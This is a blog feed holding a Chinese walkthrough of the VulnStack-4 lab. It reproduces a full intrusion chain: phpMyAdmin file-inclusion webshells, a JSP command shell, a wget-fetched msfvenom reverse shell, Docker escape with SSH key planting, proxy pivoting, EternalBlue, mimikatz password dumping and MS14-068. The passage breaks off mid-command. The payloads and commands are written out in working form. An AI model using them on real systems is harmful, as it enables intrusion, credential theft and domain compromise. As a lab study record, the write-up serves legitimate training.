<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Extraderの博客</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.extrader.top/"/>
  <updated>2021-07-06T06:05:34.767Z</updated>
  <id>https://www.extrader.top/</id>
  
  <author>
    <name>Extrader</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>VulnStack-4靶场练习</title>
    <link href="https://www.extrader.top/posts/b57d0eac/"/>
    <id>https://www.extrader.top/posts/b57d0eac/</id>
    <published>2021-07-06T12:00:00.000Z</published>
    <updated>2021-07-06T06:05:34.767Z</updated>
    
    <content type="html"><![CDATA[<p>本文全程参考 <a href="https://www.freebuf.com/articles/network/244704.html">记一次Vulnstack靶场内网渗透（二）</a> 来复现渗透过程，目的在于学习渗透流程和基本思路，记录下学习笔记</p><span id="more"></span><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>VMware</p><p>靶机地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">http://vulnstack.qiyuanxuetang.net/vuln/detail/6/</a></p><p>攻击机Kali (192.168.183.106)</p><p>虚拟网卡配置</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630130756345.png" alt loading="lazy"></p><p>Ubuntu web服务器网卡配置，配两张网卡（192.168.183.105，192.168.183.128）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630131230765.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630131200044.png" alt loading="lazy"></p><p>DC Windows Server 2008 R2服务器网卡配置（192.168.183.130）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630131335941.png" alt loading="lazy"></p><p>Windows 7网卡配置（192.168.183.129）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630131525870.png" alt loading="lazy"></p><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>nmap信息搜集</p><pre class="language-shell" data-language="shell"><code class="language-shell">nmap -T4 -A -sN <span class="token number">192.168</span>.0.105</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704205813557.png" alt loading="lazy"></p><p>开启了<code>ssh</code>，<code>tomcat</code>，<code>phpmyadmin</code>等服务</p><h3 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h3><h4 id="phpmyadmin渗透"><a href="#phpmyadmin渗透" class="headerlink" title="phpmyadmin渗透"></a>phpmyadmin渗透</h4><p>看到<code>phpmyadmin</code>版本为4.8.1，想到文件包含漏洞（CVE-2018-12613）</p><pre class="language-shell" data-language="shell"><code class="language-shell">searchsploit phpmyadmin <span class="token number">4.8</span>.1</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630142047587.png" alt loading="lazy"></p><p>测试payload：</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//192.168.0.105:2003/index.php?target=db_sql.php%253f/../../../../../etc/passwd</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704205952878.png" alt loading="lazy"></p><p>利用<code>session</code>文件包含，查询一条<code>sql</code>语句，<code>file_put_contents</code>写文件</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT &#39;&lt;?php file_put_contents(&quot;extrader.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pPz4&#x3D;&quot;));?&gt;</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704210700760.png" alt loading="lazy"></p><p><code>cookie</code>中<code>phpMyAdmin</code>的值为<code>d70bbb50bbcc99dde55870cf69eda13b</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704210737586.png" alt loading="lazy"></p><p>访问<code>http://192.168.0.105:2003/index.php?target=db_sql.php%3f../../../../../../../tmp/sess_d70bbb50bbcc99dde55870cf69eda13b</code>，把shell写进去</p><p>随后蚁剑连接</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704211035539.png" alt loading="lazy"></p><p>成功连接</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704211100989.png" alt loading="lazy"></p><h4 id="tomcat渗透"><a href="#tomcat渗透" class="headerlink" title="tomcat渗透"></a>tomcat渗透</h4><pre class="language-shell" data-language="shell"><code class="language-shell">searchsploit tomcat <span class="token number">8.5</span>.19</code></pre><p>由nmap扫描信息可知，2002端口的Tomcat版本为8.5.19，search一下发现有洞</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630142226990.png" alt loading="lazy"></p><p>用第一个脚本进行exploit</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630142742574.png" alt loading="lazy"></p><p>成功拿到root权限</p><p>利用漏洞原理传个shell，好执行命令</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630144121828.png" alt loading="lazy"></p><pre class="language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ page import&#x3D;&quot;java.util.*,java.io.*,java.net.*&quot;%&gt;&lt;%%&gt;&lt;HTML&gt;&lt;BODY&gt;&lt;FORM METHOD&#x3D;&quot;POST&quot; NAME&#x3D;&quot;myform&quot; ACTION&#x3D;&quot;&quot;&gt;&lt;INPUT TYPE&#x3D;&quot;text&quot; NAME&#x3D;&quot;cmd&quot;&gt;&lt;INPUT TYPE&#x3D;&quot;submit&quot; VALUE&#x3D;&quot;Send&quot;&gt;&lt;&#x2F;FORM&gt;&lt;pre&gt;&lt;%if (request.getParameter(&quot;cmd&quot;) !&#x3D; null) &#123;    out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;\n&lt;BR&quot;);    Process p &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));    OutputStream os &#x3D; p.getOutputStream();    InputStream in &#x3D; p.getInputStream();    DataInputStream dis &#x3D; new DataInputStream(in);    String disr &#x3D; dis.readLine();    while ( disr !&#x3D; null ) &#123;        out.println(disr); disr &#x3D; dis.readLine();     &#125;&#125;%&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;BODY&gt;&lt;&#x2F;HTML&gt;</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630144244721.png" alt loading="lazy"></p><h3 id="Docker主机逃逸"><a href="#Docker主机逃逸" class="headerlink" title="Docker主机逃逸"></a>Docker主机逃逸</h3><p><strong>msf弹shell</strong></p><pre class="language-shell" data-language="shell"><code class="language-shell">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.0.106 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> -f elf <span class="token operator">></span> shell.elf</code></pre><p>生成一个<code>msf</code>马<code>shell.elf</code></p><p>在本地用python开一个http服务</p><pre class="language-shell" data-language="shell"><code class="language-shell">python3 -m http.server</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704211900711.png" alt loading="lazy"></p><p>下载shell并给权限</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">wget</span> http://192.168.0.106:8000/shell.elf<span class="token function">chmod</span> <span class="token number">777</span> shell.elf</code></pre><p>kali机开启监听</p><pre class="language-shell" data-language="shell"><code class="language-shell">msfconsoleuse exploit/multi/handler<span class="token builtin class-name">set</span> PAYLOAD linux/x86/meterpreter/reverse_tcp<span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.183.1show optionsrun</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704211955352.png" alt loading="lazy"></p><p>随后靶机上执行<code>./shell.elf</code>，msf即可成功获得会话</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704212038957.png" alt loading="lazy"></p><h4 id="利用CVE-2019-5736逃逸"><a href="#利用CVE-2019-5736逃逸" class="headerlink" title="利用CVE-2019-5736逃逸"></a><strong>利用CVE-2019-5736逃逸</strong></h4><p>在Docker 18.09.2之前的版本中使用的runc版本小于1.0-rc6，因此允许攻击者重写宿主机上的runc 二进制文件，攻击者可以在宿主机上以root身份执行命令。</p><p>平台或产品 受影响版本 Docker Version &lt; 18.09.2 runC Version &lt;= 1.0-rc6</p><p>恶意容器需满足以下两个条件之一：</p><ul><li>由一个攻击者控制的恶意镜像创建</li><li>攻击者具有某已存在容器的写权限，且可通过docker exec进入。</li></ul><p>Poc地址：<a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p><p>是一个go写的脚本，需要自己下载编译</p><p>先装go环境</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">cd</span> /usr/local<span class="token function">wget</span> https://studygolang.com/dl/golang/go1.16.5.linux-amd64.tar.gz<span class="token function">tar</span> -xzf go1.16.5.linux-amd64.tar.gz<span class="token function">vim</span> /etc/profile添加 <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span>:/usr/local/go/bin<span class="token builtin class-name">source</span> /etc/profilego version</code></pre><p>出现版本号即安装成功</p><p>编译生成payload</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token assign-left variable">CGO_ENABLED</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">GOOS</span><span class="token operator">=</span>linux <span class="token assign-left variable">GOARCH</span><span class="token operator">=</span>amd64 go build main.go</code></pre><p>用msf会话将编译得到的main文件上传到docker容器的/home目录中，并赋权</p><pre class="language-shell" data-language="shell"><code class="language-shell">upload /home/kali/CVE-2019-5736-PoC/main /home</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630153924481.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630154042270.png" alt loading="lazy"></p><p>在kali机上监听</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">nc</span> -lvp <span class="token number">4444</span></code></pre><p>到靶机上执行<code>./main</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630154346666.png" alt loading="lazy"></p><p>此时，只需等待目标机管理员重启该docker容器，payload就会触发，如下图，我们手动模拟docker重启：</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> docker <span class="token builtin class-name">exec</span> -it 09dd4e5bfa91 /bin/bash</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630154713907.png" alt loading="lazy"></p><p>显示payload执行成功</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630154743000.png" alt loading="lazy"></p><p>但是并未收到shell</p><h4 id="利用–privileged特权模式逃逸"><a href="#利用–privileged特权模式逃逸" class="headerlink" title="利用–privileged特权模式逃逸"></a><strong>利用–privileged特权模式逃逸</strong></h4><ul><li>特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。</li><li>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行<code>docker run —privileged</code>时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。</li><li>当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</li></ul><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">mkdir</span> /hack<span class="token function">ls</span> /dev<span class="token punctuation">..</span>.sdasda1sda2sda5<span class="token punctuation">..</span>.</code></pre><p>尝试将<code>/dev/sda1</code>挂载到<code>/hack</code>目录里<code>mount /dev/sda1 /hack</code>，<code>ls /hack</code>查看，挂载成功</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630155318769.png" alt loading="lazy"></p><p><strong>在docker容器里挂载一个宿主的本地目录，这样某些容器里输出的文件，就可以在本地目录中打开访问了。</strong></p><p>将sda1挂载成功，我们就可以通过访问容器内部的/hack路径来达到访问整个宿主机的目的，比如我们访问<code>/hack/home</code>目录也就是访问宿主机的<code>/home</code>目录</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630160348268.png" alt loading="lazy"></p><p>本地生成ssh秘钥</p><pre class="language-shell" data-language="shell"><code class="language-shell">ssh-keygen -f hack<span class="token function">chmod</span> <span class="token number">600</span> hack    // 不要忘记对秘钥文件赋600权限，否则不能执行</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704212159965.png" alt loading="lazy"></p><p>我们要将<code>ssh</code>秘钥写入到<code>.ssh</code>目录里面并将文件命名为<code>authorized_keys</code>（目标机<code>.ssh</code>目录权限必须为700）。</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">cp</span> -avx /hack/home/ubuntu/.ssh/id_rsa.pub /hack/home/ubuntu/.ssh/authorized_keys    <span class="token comment"># -avx是将权限也一起复制</span><span class="token builtin class-name">echo</span> <span class="token string">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCg9LpD/MuFWzIzUQB4RQCFa8Avljlla4Z0iuk3jMQVxrxcDjOhoaLmXmbS63/crPQ15s1oEzNpi2L0MtU/ZMbDFHpKVJGSwNbZeMzEnYsOMd1x4r6BojP4bN4d2okv4sYVSCgWiNUQBHWQcUcnf3rkFw309maxSIwiNNl1C6jzwCNjo3rWA9YV8869N7q/oZtPob3M5yVT77nYMOdO4mnU/A8dbr8KkmcjoVZclK1aAnu96XJywWmArtfZjF9FdlqUkB9ZhknnpxHqP1/sH5lNk/S/pOQTq94VpU4YdK4aBt5mFj16okbudhNKGOBBlNFECcQIU/11djNDYD+FqVn7H/rKuYa7LOJkNhgXv/Q7tBIuoJBrWKqFSQPxUdiTDzeuWhWVw5Kjzf3sEoTOHqO7oUD23iQHnoO1ZwxJp/CnDRSTyCcxTcUwheM+JTSEXembyDtQWPmt3g24UNish8s3INTPT2Abd1q2mspwuSKWHuZo8yIrNq5mfS8lvkhT1rc= kali@kali'</span> <span class="token operator">></span> /hack/home/ubuntu/.ssh/authorized_keys    <span class="token comment"># 将ssh秘钥写入authorized_keys文件</span></code></pre><p>如果上面echo不进去可以直接在msf中上传</p><p>此时，攻击者就可以利用自己的私钥进行免密登陆目标宿主机了</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">ssh</span> -i hack ubuntu@192.168.0.105  <span class="token punctuation">(</span>图后面加的,IP地址变了<span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210706112334391.png" alt loading="lazy"></p><h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><h4 id="内网探测添加路由"><a href="#内网探测添加路由" class="headerlink" title="内网探测添加路由"></a>内网探测添加路由</h4><p>我们已经拿到ubuntu这台服务器，重新弹个meterpreter过来</p><p>kali机重新开启一个Web服务：<code>python3 -m http.server</code></p><p>msf上监听端口</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">set</span> AutoRunScript migrate -f  <span class="token punctuation">(</span>自动迁移进程,防止用户删除木马,丢失目标<span class="token punctuation">)</span></code></pre><p>在ubuntu上执行</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">wget</span> http://192.168.0.106:8000/shell.elf<span class="token function">chmod</span> <span class="token number">777</span> shell.elf./shell.elf</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210702142225406.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704213704739.png" alt loading="lazy"></p><p>msf传一个ew上去<code>upload /home/kali/ew_for_linux64 /home/ubuntu</code></p><p><code>ifconfig</code>查看Ubuntu上的内网</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704214545080.png" alt loading="lazy"></p><p>发现存在（192.168.183.1/24）这个内网</p><p>于是我们在ubuntu上开启socks5正向代理</p><p>ew下链接：<a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">chmod</span> <span class="token number">777</span> ew_for_linux64./ew_for_linux64 -s ssocksd -l <span class="token number">1080</span> </code></pre><p>此时，kali上的应用程序就可以通过proxychains代理进目标内网了<code>vim /etc/proxychains4.conf</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704214215866.png" alt loading="lazy"></p><p>探测内网存活的主机，因为使用的是socks的代理，只能使用tcp协议，所以nmap使用的时候要使用<code>-sT</code>选择使用<code>tcp</code>协议，要使用<code>-Pn</code>不使用<code>ICMP</code>的<code>ping</code>确认主机存活</p><pre class="language-shell" data-language="shell"><code class="language-shell">proxychains4 nmap -sT -sV -Pn -n -p22,445 <span class="token number">192.168</span>.183.0/24</code></pre><p>经过扫描可以得知目标内网中还有192.168.183.129（Win7）和192.168.183.130（DC）这两台主机。并且都开了445端口</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704222620931.png" alt loading="lazy"></p><p>在msf添加内网路由，这里直接在msf中<code>run autoroute</code>会报错</p><p>具体参考：<a href="https://www.jason-w.cn/pentest/2021/02/28/242.html">https://www.jason-w.cn/pentest/2021/02/28/242.html</a></p><pre class="language-shell" data-language="shell"><code class="language-shell">backgrounduse post/multi/manage/autorouteshow options<span class="token builtin class-name">set</span> <span class="token environment constant">SESSION</span> <span class="token number">7</span><span class="token builtin class-name">set</span> SUBNET <span class="token number">192.168</span>.183.0show optionsexploitroute</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704221640149.png" alt loading="lazy"></p><p><code>exploit</code>后查看<code>route</code>路由</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704221735839.png" alt loading="lazy"></p><h4 id="ms17-010利用"><a href="#ms17-010利用" class="headerlink" title="ms17_010利用"></a>ms17_010利用</h4><p>扫描目标内网中可能存在ms17_010永恒之蓝漏洞的主机</p><pre class="language-shell" data-language="shell"><code class="language-shell">use auxiliary/scanner/smb/smb_ms17_010 <span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.183.128-130run</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704223127961.png" alt loading="lazy"></p><p>先打Windows7这台</p><p>我们使用<code>chisel</code>代理工具来进行内网渗透连接，下载链接：<a href="https://github.com/jpillora/chisel，具体使用方法可以看：https://www.anquanke.com/post/id/234771，为什么不用原来的ew，因为用ew不稳定，`ms17_011`打不通（本人亲测打不通）">https://github.com/jpillora/chisel，具体使用方法可以看：https://www.anquanke.com/post/id/234771，为什么不用原来的ew，因为用ew不稳定，`ms17_011`打不通（本人亲测打不通）</a></p><p>Ubuntu上执行<code>./chisel server -p 2333 --socks5</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705103219718.png" alt loading="lazy"></p><p>Kali机上进行连接<code>./chisel client 192.168.0.107:2333 1080:socks</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705103303270.png" alt loading="lazy"></p><p>反向代理，这样我们kali机上的1080端口就可以访问内网里的主机了</p><p>然后用msf打</p><pre class="language-shell" data-language="shell"><code class="language-shell">setg Proxies socks5:127.0.0.1:1080       // 设置代理，不设置代理ms17_010很难打通use exploit/windows/smb/ms17_010_eternalblue<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/bind_tcp<span class="token builtin class-name">set</span> RHOST <span class="token number">192.168</span>.183.129<span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.0.106<span class="token builtin class-name">set</span> lport <span class="token number">4444</span><span class="token builtin class-name">set</span> AutoRunScript post/windows/manage/migrate             // 自动迁移进程run</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705103725565.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705103739255.png" alt loading="lazy"></p><p>一次打通</p><h4 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h4><pre class="language-shell" data-language="shell"><code class="language-shell">sysinfo                <span class="token comment">#查看主机信息</span>getuid                 <span class="token comment">#查看当前token</span>use incognito          <span class="token comment">#加载incognito，（用来盗窃目标主机的令牌或是假冒用户)</span>list_tokens -u         <span class="token comment">#列出目标主机用户的可用令牌</span>impersonate_token <span class="token string">"DEMO\douser"</span> <span class="token comment">#模拟DEMO\douser用户</span>rev2self               <span class="token comment">#返回到之前的AccessToken权限</span></code></pre><pre class="language-shell" data-language="shell"><code class="language-shell">execute -f cmd.exe -i       <span class="token comment"># 交互式运行cmd</span>execute -f cmd.exe -i -t    <span class="token comment"># 使用可用token 运行</span>execute -f cmd.exe -i -H -t <span class="token comment"># 同上，同时隐藏进程</span><span class="token comment"># 可以直接shell</span>chcp <span class="token number">65001</span>      <span class="token comment"># 简单解决一下乱码</span>ipconfig /all   <span class="token comment"># 查看本机ip，所在域</span>route print     <span class="token comment"># 打印路由信息</span>net view        <span class="token comment"># 查看局域网内其他主机名</span>arp -a          <span class="token comment"># 查看arp缓存</span><span class="token function">whoami</span>net start       <span class="token comment"># 查看开启了哪些服务</span>net share       <span class="token comment"># 查看开启了哪些共享</span>net share ipc$  <span class="token comment"># 开启ipc共享</span>net share c$    <span class="token comment"># 开启c盘共享</span>net use <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.xx.xx<span class="token punctuation">\</span>ipc$ <span class="token string">""</span> /user:<span class="token string">""</span>   <span class="token comment"># 与192.168.xx.xx建立空连接</span>net use <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.xx.xx<span class="token punctuation">\</span>c$ <span class="token string">"密码"</span> /user:<span class="token string">"用户名"</span>  <span class="token comment"># 建立c盘共享</span><span class="token function">dir</span> <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.xx.xx<span class="token punctuation">\</span>c$<span class="token punctuation">\</span>user    <span class="token comment"># 查看192.168.xx.xx c盘user目录下的文件</span><span class="token comment"># 以下命令需要切换到域用户douser执行</span>net config Workstation   <span class="token comment"># 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span>net user                 <span class="token comment"># 查看本机用户列表</span>net user /domain         <span class="token comment"># 查看域用户</span>net localgroup administrators   <span class="token comment"># 查看本地管理员组（通常会有域用户）</span>net view /domain         <span class="token comment"># 查看有几个域</span>net user 用户名 /domain   <span class="token comment"># 获取指定域用户的信息</span>net group /domain        <span class="token comment"># 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span>net group 组名 /domain    <span class="token comment"># 查看域中某工作组</span>net group <span class="token string">"domain admins"</span> /domain  <span class="token comment"># 查看域管理员的名字</span>net group <span class="token string">"domain computers"</span> /domain  <span class="token comment"># 查看域中的其他主机名</span>net group <span class="token string">"doamin controllers"</span> /domain  <span class="token comment"># 查看域控制器（可能有多台）</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705110427222.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705112759516.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705112650145.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705112722114.png" alt loading="lazy"></p><p>由搜集到的信息，我们知道目标win7在demo.com域中，域控为<code>WIN-ENS2VR5TR3N</code>，域管理员为<code>Administrator</code>，<code>ping</code>查看域控<code>ip</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705113022472.png" alt loading="lazy"></p><p>在目标机上传mimikatz，抓一下Windows 7的密码，注意要先模拟个system的令牌才能执行成功</p><pre class="language-shell" data-language="shell"><code class="language-shell">impersonate_token <span class="token string">"NT AUTHORITY\SYSTEM"</span>shellmimikatz.exeprivilege::debugsekurlsa::logonpasswords</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705122131380.png" alt loading="lazy"></p><p>得到明文密码为<code>Dotest123</code>，接下来可以进行横向移动攻击域控</p><h4 id="ms14-068利用"><a href="#ms14-068利用" class="headerlink" title="ms14-068利用"></a>ms14-068利用</h4><p>漏洞利用前提</p><ol><li>域控没有打MS14-068的补丁(KB3011780)</li><li>拿下一台加入域的计算机</li><li>有这台域内计算机的域用户密码和Sid</li></ol><p>尝试用<code>ms17_010</code>打域控机</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705133417461.png" alt loading="lazy"></p><p>利用失败</p><p>使用ms14-068，下载地址：<a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p><pre class="language-shell" data-language="shell"><code class="language-shell">upload /home/kali/Desktop/WindowsExploits/MS14-068/MS14-068.exe c:<span class="token punctuation">\</span><span class="token punctuation">\</span>users<span class="token punctuation">\</span><span class="token punctuation">\</span>douser</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705134119462.png" alt loading="lazy"></p><p>在win7上执行下面一条命令<br>域成员<code>sid</code>在上面<code>mimikatz</code>中获取到了</p><pre class="language-shell" data-language="shell"><code class="language-shell">ms14-068.exe -u douser@DEMO.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d <span class="token number">192.168</span>.183.130 -p Dotest123// ms14-068.exe -u 域成员名@域名.com -s 域成员sid 